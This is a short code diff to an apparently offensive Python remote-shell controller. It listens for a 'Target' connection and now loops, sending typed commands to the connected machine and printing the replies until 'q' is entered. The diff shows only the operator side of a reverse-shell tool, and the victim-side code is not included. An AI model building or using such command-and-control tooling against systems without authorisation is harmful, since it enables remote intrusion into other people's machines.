@@ -15,11 +15,17 @@ print("Listening for incoming connections...")
 target, ip = s.accept()
 print("Target Connected!")
 
-# SEND AND RECEIVE COMMANDS
-message = input("* Shell#~%s: " % str(ip))
-target.send(message.encode())
-result = target.recv(1024).decode()
-print(result)
+while True:
+
+    # SEND AND RECEIVE COMMANDS
+    message = input("* Shell#~%s: " % str(ip))
+    target.send(message.encode())
+    
+    if message == "q":
+        break
+    else:
+        answer = target.recv(1024).decode()
+        print(answer)
 
 # CLOSE CONNECTION
 s.close()
